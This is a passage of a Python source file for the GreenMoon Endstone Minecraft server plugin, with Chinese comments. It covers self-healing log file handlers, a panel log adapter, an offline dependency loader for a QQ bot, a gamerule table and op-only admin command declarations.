                self.stream.flush()
                # ★ 关键：Linux 上「写一个已被删除的文件」是**成功**的
                # （数据进了孤儿 inode，用户看不到），所以必须显式探活。
                # Windows 上则会在 write 直接失败，走下面的 except 分支。
                # 两条路径都靠这里兜住，日志才不会「看起来正常实际丢了」。
                if not self._alive():
                    raise OSError("log file replaced")
            except Exception:
                # 流坏了：重开一次再试
                try:
                    try:
                        if self.stream is not None:
                            self.stream.close()
                    except Exception:
                        pass
                    self.stream = None
                    if self._open():
                        self.stream.write(self.format(record) + "\n")
                        self.stream.flush()
                except Exception:
                    pass                    # 彻底放弃，静默

    def _alive(self):
        """确认当前流指向的文件**仍然存在**，且就是我们要写的那个。

        用 ``os.stat`` 比对 inode/设备号：文件被删掉再重建时，
        旧句柄的 inode 与路径上的新文件不一致，据此判定需要重开。
        Windows 上 ``st_ino`` 可能为 0，此时退化为「路径是否存在」。
        """
        if self.stream is None:
            return False
        try:
            path_stat = os.stat(self.baseFilename)
        except Exception:
            return False                    # 文件没了
        try:
            fd_stat = os.fstat(self.stream.fileno())
        except Exception:
            return False
        try:
            if path_stat.st_ino and fd_stat.st_ino:
                return path_stat.st_ino == fd_stat.st_ino
        except Exception:
            pass
        return True                         # 拿不到 inode 就认为还活着

    def flush(self):
        with self._lock:
            try:
                if self.stream is not None:
                    self.stream.flush()
            except Exception:
                pass

    def close(self):
        with self._lock:
            try:
                if self.stream is not None:
                    self.stream.close()
            except Exception:
                pass
            self.stream = None
        try:
            super().close()
        except Exception:
            pass


class _ResilientRotatingHandler(logging.handlers.RotatingFileHandler):
    """``RotatingFileHandler`` + 自愈：写入失败时重开文件，绝不惊动 logging。

    与 ``_ResilientFileHandler`` 的分工：
      * ``_ResilientFileHandler`` 是手写的「无限追加 + 显式探活」，用于
        极端环境（父目录会被删掉重建）；
      * 本类继承标准库的 ``RotatingFileHandler``，白拿 8MB × N 的自动轮转，
        只把 **异常路径** 换成自愈逻辑。

    为什么必须覆写 ``emit`` 与 ``handleError``：

      python 的 ``logging.Handler.handleError`` 默认会往 ``sys.stderr`` 打
      「--- Logging error ---」。Endstone 的 C++ 层捕获到这次 stderr 写入，
      就会报成 ``[*** LOG ERROR ***] write failed`` —— 我们要根治的正是这条
      链路，所以必须**保证任何路径都不往 stderr 冒异常**。
    """

    def emit(self, record):
        try:
            super().emit(record)
        except Exception:
            # 轮转失败 / 句柄失效：关掉重开一次再试
            try:
                self._reopen()
                super().emit(record)
            except Exception:
                pass                    # 彻底放弃，静默 —— 绝不冒到 logging

    #: 目录补建最多尝试次数。够用即可 —— 补建不了说明是权限/磁盘问题，重试无益。
    _MKDIR_TRIES = 3

    def _ensure_dir(self):
        """确保日志文件的父目录存在。**必须在 _open 之前调用**。

        为什么要单独拎出来：``RotatingFileHandler`` 的 ``shouldRollover()``
        会**自己直接调 `self._open()`**，并不经过 ``emit()`` 的 try/except。
        于是首次写日志时若父目录不存在，就在那里抛 ``FileNotFoundError``，
        而 python 的 ``BaseRotatingHandler`` 会把它送到 ``handleError`` →
        stderr → 被 Endstone 的 C++ 层看成 ``write failed``。

        我们自己覆写的 ``handleError`` 虽然吞掉了异常，但**日志也丢了**。
        所以正确做法是主动补建目录，而不是等它出错。
        """
        parent = os.path.dirname(os.path.abspath(self.baseFilename))
        if not parent or os.path.isdir(parent):
            return True
        for _ in range(self._MKDIR_TRIES):
            try:
                os.makedirs(parent, exist_ok=True)
            except Exception:
                pass
            if os.path.isdir(parent):
                return True
        return False

    def _open(self):
        """覆写底层开文件：先保证目录在，再交给标准库。

        ``delay=True`` 时这里是**惰性**触发的 —— 标准库在首次 emit 时
        才会走到 ``_open``，因此「启动时不占句柄」的特性不受影响。
        """
        try:
            self._ensure_dir()
        except Exception:
            pass
        return super()._open()

    def _log_target_gone(self):
        """日志目标是不是「已经不在了」，需要重开。

        覆盖两种实测会静默丢日志的情况：

          1. **父目录被整个删掉**。此时 ``self.stream`` 依然是个有效对象，
             它持有的 fd 指向一个已被 unlink 的 inode，``stream is not None``
             仍为真 —— 标准库会高高兴兴往一个磁盘上已经看不到的文件里写。
          2. **日志文件本身被外部删掉**（用户手动清理、外部轮转脚本、
             杀软隔离），目录还在。同样因为 fd 还有效，写入会落到孤儿 inode。

        两种情况在 Linux 上都「看起来正常」（数据进了已删除的 inode，
        进程退出即消失），在 Windows 上则直接报写入失败 —— 正是 ``write failed``
        的一个来源。

        探测一律用 ``os.path`` 而不是 ``stream.closed``：文件被 unlink 后
        ``stream.closed`` 仍然是 ``False``，抓不到。
        """
        try:
            if self.stream is None:
                return False            # 还没打开，交给 _open 的正常路径
            base = os.path.abspath(self.baseFilename)
            parent = os.path.dirname(base)
            if parent and not os.path.isdir(parent):
                return True
            if not os.path.exists(base):
                return True
            # 目录在、文件在，还要确认它就是我们打开的那个（防被换成同名新文件）
            try:
                if os.stat(base).st_ino != os.fstat(self.stream.fileno()).st_ino:
                    return True
            except Exception:
                pass                    # stat 失败不算证据，别误重建
        except Exception:
            pass
        return False

    def shouldRollover(self, record):
        """在标准库判定之前，先确认日志文件还「真实存在」。

        标准库的 ``RotatingFileHandler`` 只关心大小，不检查文件是否还在，
        所以必须在它前面拦一道；发现目标没了就 ``_reopen()``，
        让 ``_open()`` 走上补建目录/重建文件的路径。
        """
        try:
            if self._log_target_gone():
                self._reopen()
        except Exception:
            pass
        return super().shouldRollover(record)

    def _reopen(self):
        with self.lock:
            try:
                if self.stream is not None:
                    self.stream.close()
            except Exception:
                pass
            self.stream = None
            try:
                self._ensure_dir()
            except Exception:
                pass
            try:
                self.stream = self._open()
            except Exception:
                self.stream = None

    def handleError(self, record):
        """空实现：**刻意**吞掉所有异常，不让它落到 stderr。"""
        return

    # 轮转失败（Windows 上文件被占用是常态）不要抛，改成「本次不轮转，继续追加」
    def doRollover(self):
        try:
            super().doRollover()
        except Exception:
            try:
                self._reopen()
            except Exception:
                pass


class _PanelLoggerAdapter:
    """包住 Endstone 的 ``Logger``，把每条日志**额外**喂给面板环形缓冲。

    ★ 为什么不能像普通 Python 那样 ``logger.addHandler(...)``
    ------------------------------------------------------
    Endstone 的 ``endstone._python.Logger`` **不是** ``logging.Logger``
    的子类，它只有这几个方法（实测 0.11.11 的 .pyi）：:

        set_level / is_enabled_for / trace / debug / info
        / warning / error / critical / name

    没有 ``addHandler``、没有 ``handlers``、也没有 ``propagate``。
    所以在它身上挂 Handler 必然抛 ``AttributeError`` ——
    这正是线上日志里那条
    ``[日志] 面板日志采集未启用: 'endstone._python.Logger' object has no attribute 'addHandler'``
    的来历，结果是面板「日志」页**永远是空的**。

    Endstone 侧链路不可插桩，那就从**我们自己的调用入口**插：
    插件内部全部通过 ``self.logger.xxx()`` 打日志，把 ``self.logger``
    换成这个适配器，就同时拿到了面板缓冲和原生日志两个出口。

    ★ 设计上的两条硬约束

    1. **绝不能吞掉原生日志**。面板是附加通道，原生 ``latest.log``
       与控制台输出必须原样保留 —— 否则为了修一个面板功能，
       把排障用的主日志搞没了，那是倒退。因此每次都照常转发。
    2. **绝不能因为面板缓冲的异常影响主流程**。``_append_console_log``
       本身已经内部 try/except，这里再包一层，多余但便宜。
    """

    #: Endstone Logger 的级别名 → 内部统一用的大写名
    _LEVELS = ("trace", "debug", "info", "warning", "error", "critical")

    def __init__(self, inner, plugin):
        self._inner = inner
        self._plugin = plugin

    def __getattr__(self, name):
        # 未显式包装的属性（name / set_level / is_enabled_for ...）
        # 一律透传给原生 logger，保持行为完全一致。
        return getattr(self._inner, name)

    def _emit(self, level: str, args, kwargs):
        """一次日志出口：**先无条件转发原生，再按级别决定要不要进面板缓冲**。

        ★★ 顺序至关重要，别调换
        -----------------------
        原生转发（``fn(*args)``，即 ``latest.log`` 与控制台）必须在**最前面
        无条件执行**。分级过滤只针对**面板自己的内存缓冲**：「平时少看点、
        诊断时全看」是浏览体验需求，而 ``latest.log`` 是事后排障的唯一凭据，
        少一行都可能是破案关键。

        `test_qq_resilience.py` 有一条硬约束断言「适配器转发全部级别且
        **绝不吞掉原生日志**」—— 把过滤放在转发之前、或让转发依赖过滤
        结果，都会直接违反它。
        """
        try:
            text = str(args[0]) if args else ""
        except Exception:
            text = ""
        # ① 原生转发：无条件、最先执行、返回值原样带出去
        fn = getattr(self._inner, level, None)
        out = fn(*args, **kwargs) if fn is not None else None
        # ② 面板缓冲：按「详细日志 + 级别阈值」过滤，纯附加通道
        try:
            if self._plugin._panel_log_wanted(level):
                self._plugin._append_console_log(level.upper(), text)
        except Exception:
            pass
        return out

    def trace(self, *args, **kwargs):
        return self._emit("trace", args, kwargs)

    def debug(self, *args, **kwargs):
        return self._emit("debug", args, kwargs)

    def info(self, *args, **kwargs):
        return self._emit("info", args, kwargs)

    def warning(self, *args, **kwargs):
        return self._emit("warning", args, kwargs)

    def error(self, *args, **kwargs):
        return self._emit("error", args, kwargs)

    def critical(self, *args, **kwargs):
        return self._emit("critical", args, kwargs)

    @property
    def name(self):
        try:
            return self._inner.name
        except Exception:
            return ""


class _PanelLogHandler(logging.Handler):
    """把面板日志收进环形缓冲，供网页「日志」页展示。

    ★ 为什么必须在 logging 层采集，而不是抓 fd 1/2
    ----------------------------------------------
    旧实现（已删除）用 ``os.dup2(w, 1)`` 把进程的 stdout/stderr 换成一个
    匿名管道，再从管道的读端把内容捞出来。这在 Windows 上会直接引发
    ``[*** LOG ERROR #0001 ***] [GreenmoonPanel] write failed``：

      * Endstone C++ 侧的 ``ConsoleLogSink`` 在启动时**已经持有 fd 1 的
        ``FILE*``**。我们把 fd 1 换成管道后，这个 ``FILE*`` 仍然指向 fd 1，
        但它以为自己在写控制台；
      * 于是 C++ 侧每次打日志都写进一个**没人读**的匿名管道，管道缓冲区
        （Windows 上仅 4KB）一满，``write`` 就阻塞或失败；
      * 同时 ``FileLogSink`` 写 ``logs/latest.log`` 也受影响 —— 报错模板
        ``[*** LOG ERROR #%04zu ***] [%s] [%s] %s`` 里的 ``#0001`` 是自增
        计数器，``write failed`` 是末尾 ``%s`` 的实际取值，全部来自
        ``libendstone_runtime.so`` 里的 ``Unable to write file '{}': {}``。

    根因是**我们动了不属于我们的 fd**。所以本实现的原则是：

        >>> 不碰 fd，不碰 C++ sink，只在 Python logging 层做加法。

    Python 侧本来就有 Python 自己的 ``logging`` 链路（插件与 gm API 都走它），
    直接挂一个 ``Handler`` 就能拿到同样的内容，且完全不干扰 C++ 的
    ``ConsoleLogSink`` / ``FileLogSink``。
    """

    def __init__(self, plugin):
        super().__init__()
        self.plugin = plugin
        self.setFormatter(logging.Formatter("%(message)s"))

    def emit(self, record):
        # ★ 绝不能让本 handler 的异常冒到 logging 层：
        # 一旦冒上去，logging 会走 handleError() 往 stderr 打印
        # 「--- Logging error ---」，那又会回到 C++ 侧看起来像写失败。
        try:
            msg = record.getMessage()
            if not msg.strip():
                return
            # 与 _PanelLoggerAdapter._emit 用**同一套**级别过滤，
            # 否则 gm API / 子插件这条 logging 链路会成为绕过开关的后门
            # ——「关掉详细日志」却仍被子插件刷屏。
            # ⚠ 注意：本 handler 只写面板缓冲，不涉及原生转发，
            #   所以这里直接过滤即可，不会影响 latest.log。
            if not self.plugin._panel_log_wanted(record.levelname):
                return
            self.plugin._append_console_log(record.levelname, msg)
        except Exception:
            pass


def _load_offline_wheels(plugin, libs_dir):
    """确保 QQ 网关所需的 requests / websockets 可用，返回 ``(requests, websockets)``。

    ⚠ 这里**只负责把库取到手**，不负责往 sys.path 里插路径。
    真正的路径注册统一交给 ``libs_loader.install()``（在 ``on_enable``
    里、比本函数更早执行），原因见下。

    历史坑（已修）：本函数原先自己动手挂路径 ——
    ``sys.path.insert(0, libs_dir)`` 加上对每个 ``*.whl`` 的
    ``insert(0, whl)``。而 ``libs_loader`` 是把**解压目录**追加到
    ``sys.path`` 末尾的。两者叠加的结果是：whl 路径排到了解压目录**之前**，
    于是 ``import PIL`` 被 zipimport 抢先命中 wheel 内部那份
    （只有纯 Python 部分、没有 ``.so``），Pillow 当场变空壳 ——
    ``_imaging`` 加载失败，地图画每张图都静默失败。

    实测证据（``python3 -S``，剥离 site-packages）::

        libs_loader.install() 之后:
            PIL -> <libs>/_unpacked/pillow-.../PIL/__init__.py
            _imaging_ok=True   resize=ok
        _load_offline_wheels() 之后（旧实现）:
            PIL -> <libs>/pillow-....whl/PIL/__init__.py   ← 掉回 wheel 里
            _imaging_ok=False  resize=ImportError

    所以现在这里**一律不碰 sys.path** —— 依赖由 libs_loader 负责注册，
    本函数只做「取库」和「报缺库」。
    """
    try:
        libs_dir.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        plugin.logger.error(f"[QQ] 创建离线依赖目录失败 {libs_dir}: {e}")

    try:
        import requests as _requests
        import websockets as _websockets
        return _requests, _websockets
    except Exception as e:
        # 明确点名缺的是哪两个包。
        #
        # 为什么要这么啰嗦：libs/ 现在是**通用**的离线依赖目录，用户可能
        # 往里面放 Pillow（给地图画用）。如果只报一句「第三方库不可用」，
        # 放了 Pillow 却看到 QQ 网关起不来的人会完全摸不着头脑 ——
        # 容易误以为"我明明放了库啊"，甚至去删 Pillow 的 whl 反复试。
        # 所以这里点破：这两个包是做 QQ 通信用的，与图像无关。
        missing = []
        try:
            import requests  # noqa: F401
        except Exception:
            missing.append("requests")
        try:
            import websockets  # noqa: F401
        except Exception:
            missing.append("websockets")
        names = "、".join(missing) if missing else "requests 或 websockets"
        plugin.logger.error(
            f"[QQ] 机器人网关无法启动：缺少第三方库 {names}。\n"
            f"    请把对应 .whl 放进 {libs_dir} 后重启服务器。\n"
            f"    （这两个库用于 QQ 通信，和图像功能无关 —— "
            f"Pillow / PIL 的 whl 不解决这个问题，也不要把它们删掉。）\n"
            f"    底层错误：{type(e).__name__}: {e}"
        )
        return None

def _to_slot(key):
    if key in (None, "", "null", "none"):
        return None
    v = _SLOT_MAP.get(str(key).lower())
    if v is None:
        return None
    return DisplaySlot(v) if DisplaySlot else v

def _to_order(key):
    v = _ORDER_MAP.get(str(key).lower(), 0)
    return ObjectiveSortOrder(v) if ObjectiveSortOrder else v

def _to_render(key):
    v = _RENDER_MAP.get(str(key).lower(), 0)
    return RenderType(v) if RenderType else v

def _dummy_criteria():
    return Criteria.DUMMY if Criteria is not None else 0

def _parse_expiration(expires) -> Optional[datetime]:

    if expires in (None, "", 0, "0", False, "null", "none", "permanent"):
        return None
    try:
        seconds = int(float(expires))
        if seconds <= 0:
            return None
        return datetime.now() + timedelta(seconds=seconds)
    except (TypeError, ValueError):
        try:
            return datetime.fromisoformat(str(expires))
        except Exception:
            return None

def _format_template(template: str, values: dict):
    """把用户自定义的播报模板套上变量，返回**从新到旧**尝试出的结果。

    模板来自面板输入框，用户可能写成 ``%s`` 也可能写成 ``%(player)s``，
    还可能出现占位符个数对不上（多写一个 ``%s``）的情况。这里依次尝试：

      1. ``%(key)s`` 命名式
      2. 按 ``values`` 的插入顺序展开 ``%s``
      3. 模板整体替换失败时的降级：把占位符替换成对应值，不报错

    任何一种成功就返回；全部失败返回 ``None``，由调用方决定是否放弃这条
    播报。**绝不抛异常** —— 播报失败不该影响聊天/进服/退服主流程。
    """
    text = str(template or "")
    if not text:
        return None
    vals = list(values.values())
    # 1) 命名式：%(player)s
    try:
        out = text % values
        if "%(" not in text:
            raise ValueError("非命名式模板，交给下一步处理")
        return out
    except Exception:
        pass
    # 2) 位置式：按插入顺序补 %s
    try:
        return text % tuple(vals)
    except Exception:
        pass
    # 3) 个数对不上时的宽松降级：逐个吃掉 %s，多余的原样保留
    try:
        out = text
        for v in vals:
            if "%s" not in out:
                break
            out = out.replace("%s", str(v), 1)
        return out
    except Exception:
        return None


def _cat_transform(message: str) -> str:

    if not message:
        return message
    msg = str(message)

    msg = msg.replace("我", "本喵")

    msg = re.sub(r"([。！？!?；;…\n]+)", r"\1喵", msg)

    if not msg.endswith("～"):
        msg += "～"
    return msg

GAMERULES = [
    {"name": "keepinventory", "label": "死亡不掉落", "desc": "玩家死亡后保留物品与经验", "type": "bool", "default": False, "category": "生存与掉落"},
    {"name": "mobgriefing", "label": "防爆（怪物破坏方块）", "desc": "关闭后苦力怕/末影龙/TNT 等无法破坏方块、怪物不能捡物", "type": "bool", "default": True, "category": "生存与掉落"},
    {"name": "dotiledrops", "label": "方块自然掉落", "desc": "关闭后挖方块不掉落物品", "type": "bool", "default": True, "category": "生存与掉落"},
    {"name": "domobloot", "label": "生物死亡掉落", "desc": "关闭后打怪不掉战利品与经验", "type": "bool", "default": True, "category": "生存与掉落"},

    {"name": "dodaylightcycle", "label": "昼夜循环", "desc": "关闭后时间停止不动", "type": "bool", "default": True, "category": "时间与天气"},
    {"name": "doweathercycle", "label": "天气循环", "desc": "关闭后锁定当前天气（下雨/雷暴不再自然变化）", "type": "bool", "default": True, "category": "时间与天气"},
    {"name": "dofiretick", "label": "火焰蔓延与熄灭", "desc": "关闭后火不会蔓延、不会自然熄灭", "type": "bool", "default": True, "category": "时间与天气"},
    {"name": "tntexplodes", "label": "TNT 爆炸", "desc": "关闭后 TNT 不爆炸、不破坏地形", "type": "bool", "default": True, "category": "时间与天气"},

    {"name": "showdeathmessages", "label": "显示死亡信息", "desc": "关闭后聊天栏不弹出死亡提示", "type": "bool", "default": True, "category": "玩家行为"},
    {"name": "doimmediaterespawn", "label": "立即重生", "desc": "开启后死亡直接复活、不显示死亡界面", "type": "bool", "default": False, "category": "玩家行为"},
    {"name": "naturalregeneration", "label": "自然回血", "desc": "关闭后不进食不会自动回血", "type": "bool", "default": True, "category": "玩家行为"},
    {"name": "pvp", "label": "玩家互伤（PVP）", "desc": "关闭后玩家之间无法互相伤害", "type": "bool", "default": True, "category": "玩家行为"},

    {"name": "domobspawning", "label": "自然生成怪物", "desc": "关闭后不再自然刷怪", "type": "bool", "default": True, "category": "怪物与生成"},
    {"name": "doinsomnia", "label": "幻翼生成", "desc": "关闭后熬夜不再生成幻翼", "type": "bool", "default": True, "category": "怪物与生成"},

    {"name": "commandblockoutput", "label": "命令方块输出", "desc": "关闭可避免命令方块刷屏（服务器建议关）", "type": "bool", "default": True, "category": "聊天与提示"},
    {"name": "sendcommandfeedback", "label": "命令反馈提示", "desc": "关闭后不再弹命令执行反馈（建议关）", "type": "bool", "default": True, "category": "聊天与提示"},

    {"name": "maxcommandchainlength", "label": "命令方块连锁长度", "desc": "单刻命令连锁最大数量", "type": "int", "default": 65536, "min": 0, "category": "数值设置"},
    {"name": "randomtickspeed", "label": "随机刻速度", "desc": "植物生长/冰融化速度，0=停止（基岩原版默认 1）", "type": "int", "default": 1, "min": 0, "category": "数值设置"},
]

class GreenMoonPlugin(Plugin):
    api_version = "0.11"

    # ---- /gmback 救援指令 ------------------------------------------------
    # 必须是类属性：Endstone 在插件注册阶段（早于 on_enable）就读取它们登记
    # 指令，运行时再往 self.commands 里塞是无效的。
    commands = {
        "gmback": {
            "description": "停用 admin 型子插件，把 /admin 还原为面板自带管理页",
            # ★ usages 是参数语法，不是示例文本（详见下面 /gm 的长注释）。
            #   写成 ["/gmback", "/gmback list"] 会让 "list" 被当成**参数名**，
            #   多敲一个词就报 "Unexpected ..."。改用可选枚举才正确。
            #   枚举语法：(值1|值2) 在前，[参数名: 类型名] 在后。
            "usages": [
                "/gmback (list)[action: gmbackAction]",
                "/gmback",
            ],
            "permissions": ["greenmoon.command.gmback"],
        },
        "gmreload": {
            "description": "热重载主插件：重新读取配置并重启 QQ 机器人，无需重启服务器",
            # 同样的问题：["/gmreload config"] 里的 config 会被当成参数名。
            "usages": [
                "/gmreload (config|bot|status)[action: gmreloadAction]",
                "/gmreload",
            ],
            "permissions": ["greenmoon.command.gmreload"],
        },
        # ---- /gm 配置指令 -------------------------------------------------
        #
        # ★ 为什么必须有这条指令（面板服的真实处境）
        # ------------------------------------------
        # 安装向导走的是"读 stdin"这条路。而面板服的现实是：控制台被
        # 面板商接成了日志管道，**根本没有可读的输入通道** —— 探测会
        # 正确地判定为 False，向导于是跳过，退回自动生成 admin + 乱码密码。
        #
        # 换句话说：这类环境**永远**等不到向导。而服主明明有一个控制台，
        # 只是它只能"发指令"、不能"回答问题"。
        #
        # 走 BDS 指令就绕开了整个 stdin 难题：
        #   * 指令注册是 Endstone 的官方机制，控制台/游戏内都能敲；
        #   * 参数从指令参数来，不碰 stdin，任何环境都一样；
        #   * 面板服网页控制台天然支持敲指令。
        #
        # 权限定"op"：这条指令能改后台账号密码，绝不能给普通玩家。
        # 后台控制台以最高权限执行，不受此限制 —— 正是我们想要的主路径。
        #
        # ★★ usages 是**参数语法声明**，不是"示例文本"（这里踩过坑）
        # ---------------------------------------------------------
        # 曾经写成 ["/gm", "/gm show", "/gm port 8080", "/gm name admin", ...]
        # 看起来像"给人看的例子"，但 Endstone 会拿每一条去**解析参数**：
        #   "/gm name admin"  →  action 名 = "name"，值名 = "admin"
        # 于是 `gm name h` 里的 h 落到了参数名之外，BDS 直接报
        #   Syntax error: Unexpected "h": at "gm name >>h<<"
        # 而 `gm name admin` 碰巧不越界 —— 这种"有的能跑有的报错"最难查。
        #
        # 正确写法（Endstone 官方语法，见 register-commands 教程）：
        #   <名称: 类型>              必选参数
        #   [名称: 类型]              可选参数
        #   (a|b|c)<名称: 枚举类型名>  必选枚举：括号在前、尖括号在后
        #
        # 这里用**枚举**约束 action：敲 /gm 时 BDS 会自动补全这几个子命令，
        # 敲错的值当场被拦下（有明确报错），比在 on_command 里自己判 "未知参数"
        # 体验好得多。
        # value 是**可选**：/gm 与 /gm show 都不带值。
        # value 用 str 而非 message：message 会"吃到行尾"，而我们要把
        # 值当单个参数处理（密码可能含空格，在 _gm_config_command 里自行
        # 拼接 —— BDS 会按空格拆开再传进来）。
        "gm": {
            "description": "配置 GreenMoon 面板（端口 / 管理员账号 / 密码）",
            "usages": [
                "/gm (show|port|name|pass|apply)<action: gmAction> [value: string]",
                "/gm",
            ],
            "permissions": ["greenmoon.command.gm"],
        },
    }

    permissions = {
        # 默认 op：后台控制台以最高权限执行不受此限制，游戏内则只有 OP 能用。
        # 普通玩家拿不到，符合「救援指令」的定位。
        "greenmoon.command.gmback": {
            "description": "允许使用 /gmback 救援指令（停用 admin 型子插件）",
            "default": "op",
        },
        # 热重载会影响全服（机器人短暂掉线、配置即时生效），同样限 OP。
        "greenmoon.command.gmreload": {
            "description": "允许使用 /gmreload 热重载主插件（配置与 QQ 机器人）",
            "default": "op",
        },
        # /gm 能改后台端口与管理员凭据 —— 等同于"拿走后门钥匙"，
        # 必须限 OP。后台控制台本身以最高权限执行，不受影响。
        "greenmoon.command.gm": {
            "description": "允许使用 /gm 修改面板端口 / 管理员账号 / 密码",
            "default": "op",
        },
    }

    # ---- 主线程身份（供 _run_in_server_thread 判定"要不要调度"）-----------
    #
    # on_enable 跑在服务器的 tick 主线程上，所以在这里记下的 ident 就是
    # "主线程"的权威身份。
    #
    # ⚠ 为什么要在 on_enable 里**快照**，而不是在要用的时候现取：
    # Endstone 可能在**后台线程**里调用插件的事件处理器（事件是原版主动
    # 派发的，不保证线程）。而 self._main_thread_id 一旦被后台线程写坏，
    # _run_in_server_thread 就会把「后台线程」误认成主线程，于是**直接
    # 同步执行**本该在主线程跑的逻辑（给玩家发贴图、改背包……）。
    # 那会从后台线程去碰服务器状态 —— 轻则无效，重则直接崩服。
    #
    # 快照之后，_main_thread_id 只被赋值一次（on_enable 之前为 None），
    # 之后任何线程都删不掉、改不了，判定永远正确。
    _main_thread_id = None

    # ---- 关键状态的类级兜底 ------------------------------------------------
    #
    # ★ 为什么这个类需要它们（本次审计发现的一类问题）
    # --------------------------------------------------
    # GreenMoonPlugin **没有 __init__**（Endstone 的 Plugin 由 C++ 侧构造，
    # 我们不控制实例化过程），所有状态都在 on_enable 里 setattr 出来。
    # 于是"能不能读到某个属性"取决于 on_enable 跑到哪一行 —— 一旦
    # 初始化中途出任何岔子（异常 / 提前 return / 事件在主线程之前就扑进来），
    # 后续一切访问都是裸 AttributeError。
    #
    # 更糟的是这些 AttributeError 会被散落各处的 ``except Exception`` 吃掉，
    # 表现为"功能静默消失"，而不是"报错告诉你哪没初始化" —— 这正是
    # 本次审计里"子插件 setup() 读 _cache_lock 崩掉"的同一个病根。
    #
    # 下面只给**被跨线程 / 跨模块读取、且读不到就会炸**的少数几个加兜底。
    # 不给全部 62 个实例属性加：那样会把"真的忘了初始化"也掩盖掉 ——
    # 兜底的目标是"让程序能降级运行并给出可读的日志"，不是"假装没事"。
    #
    # ⚠ 这些默认值必须与 on_enable 里的真实初值**语义一致**：
    #    一个空的 dict / 一个真的 Lock()，而不是 None。
    #    否则兜底本身会变成新的 NoneType 崩溃点。
    _cache: Dict[str, Any] = {}
    _cache_lock = threading.Lock()
    _gamerule_values: Dict[str, Any] = {}
    _messages_lock = threading.Lock()
    _whitelist_lock = threading.Lock()
    _tools_lock = threading.Lock()
    _backup_lock = threading.Lock()
    _tick_lock = threading.Lock()
    _console_lock = threading.Lock()
    _messages: collections.deque = collections.deque(maxlen=200)
    trust = None
    cross = None
    conn_mgr = None
    qq_hub = None
    regex_engine = None
    web_config: Dict[str, Any] = {}
    httpd = None
    _panel_log_handler = None
    data_dir = None
    #: 未配置凭据时的日志节流时间戳（web.py 的 _resolve_auth 用）。
    #: 类级兜底：否则面板一旦在 _load_config 之前收到请求，
    #: getattr 取不到这个属性会走进异常分支。
    _no_cred_warn_at = 0.0

    # ---- 数据目录 / 日志失败上报（供面板"诊断"页展示）---------------------
    #
    # ★ 为什么要有这两个字段：
    # 用户线上反馈"日志写入错误"，但排查时完全无从下手 —— 因为失败全被
    # ``except: pass`` 吞掉了，控制台和面板上**看不到任何线索**。
    # 这两个字段把"为什么没写"显式化：
    #   _data_dir_error : data_folder 解析失败的原文（上游根因）
    #   _log_error      : 日志文件最终没能启用/写入的原因
    # 二者都由 /api/diag 透传给前端，在诊断页顶显示 ★★★ 提示。
    #
    # 用类属性给默认值，保证任何时刻 getattr 都有结果；同时被测代码在
    # 「假宿主」上运行时（测试用 ast 抽方法注入）也不会 AttributeError。
    _data_dir_error = None
    _log_error = None

    # ---- 区块日志系统（regionlog）---------------------------------------
    #
    # ★ ``_stopping`` 是**关服窗口标志**，被回档引擎在每一批开头读取。
    #   为什么必须是类属性兜底而不是只靠 on_disable 里赋值：
    #   引擎的定时回调可能在 on_enable 还没跑完时就排进来（比如上一个
    #   运行期留下的调度），那时实例上没有这个属性，getattr 取不到会
    #   走 host 的默认值 —— 恰好也是 False（安全方向），但**依赖默认值
    #   是对的，不如显式写出来**：属性存在与否不该影响安全判定。
    _stopping = False
    #: 区块日志 API（RegionAPI）。None 表示未装配 / 初始化失败。
    region_api = None
    #: 子插件面板注册表。见 admin_web/panel.py。
    panel_registry = None

    # ---- 面板日志采集：logger 属性遮蔽 -----------------------------------
    #
    # ★★ 这里踩过一个**导致插件完全无法启用**的坑，务必看完再改 ★★
    #
    # ``Plugin.logger`` 在 Endstone 里是**只读 property**（0.11.11 实测：
    # Plugin 上 config / logger / plugin_loader / server / is_enabled /
    # name / data_folder 全部只读，一个 setter 都没有）。所以
    #
    #     self.logger = something      # ← AttributeError!
    #
    # 会直接抛 ``AttributeError: property of 'GreenMoonPlugin' object has
    # no setter``，异常从 on_enable 冒出去 → **整个插件启用失败**，
    # 服务器上表现为「面板加载了但没启用」，日志里只有一行 AttributeError。
    #
    # 正确做法是**用同名 property 遮蔽基类 property**：
    # Python 的属性查找优先走子类 __dict__，所以本类的 property 会盖住
    # Endstone 基类那个只读 property，且**不需要 setter**。
    #
    # 另一个必须这么做的原因：cross/hub/qqbot/regex_engine 等子组件在
    # 构造时执行 ``self.logger = plugin.logger``（在它们**自己的**对象上
    # 赋值，合法）。也就是说它们在实例化那一刻就把 logger 引用抓走了。
    # 只有让 ``plugin.logger`` 从**一开始**就返回适配器，这些子组件
    # 才会拿到带面板采集能力的那个；晚一步换都来不及。
    _panel_logger = None       # 适配器实例；None 表示未启用采集
    _raw_logger = None         # Endstone 原生 Logger，兜底用

    @property
    def logger(self):
        """返回带面板采集能力的 logger。

        * 采集已启用 → 返回 ``_PanelLoggerAdapter``（同时写原生日志+面板缓冲）
        * 采集未启用/失败 → 返回 Endstone 原生 ``Logger``，行为与从前一致

        ★ 三种取值的优先级（**缺一不可**，踩过坑）：
          1. ``_panel_logger`` —— 适配器，已装配
          2. ``_raw_logger``   —— 已快照的原生 logger
          3. 基类 ``Plugin.logger`` —— **尚未执行 _install_panel_logger 时**

        第 3 条至关重要：``on_enable`` 开头第一行就是
        ``self.logger.info("GreenMoonPanel 已启用")``，而装配发生在
        之后（要等 _console_logs 缓冲建好）。如果这里在装配前返回 None，
        那行日志就会 ``AttributeError: 'NoneType' object has no attribute
        'info'``，**插件照样启用失败** —— 等于从一个坑掉进另一个坑。

        因此兜底必须一路退到基类 property，绝不返回 None。
        """
        adapter = self._panel_logger
        if adapter is not None:
            return adapter
        raw = self._raw_logger
        if raw is not None:
            return raw
        # 装配前：直接问基类要原生日志（Plugin.logger 是只读 property）
        try:
            return Plugin.logger.__get__(self, type(self))
        except Exception:
            return None

    def _install_panel_logger(self):
        """装配面板日志采集。**本方法绝不抛异常，也绝不阻断启用流程。**

        设计要点（都是上面那个崩溃事故的直接教训）：
          1. 只在 ``_panel_logger`` 上写入适配器，**永不给 self.logger 赋值**；
          2. 任何一步失败都静默回退到原生 logger，不写 ``_log_error``
             （面板日志只是附加功能，坏了不该在诊断页报红）；
          3. 若 Endstone 将来把 Logger 换成标准 logging.Logger（带
             addHandler），则走常规 Handler 路线挂 _PanelLogHandler。
        """
        try:
            raw = Plugin.logger.__get__(self, type(self))
        except Exception:
            try:
                raw = getattr(super(), "logger", None)
            except Exception:
                raw = None
        self._raw_logger = raw
        if raw is None:
            return

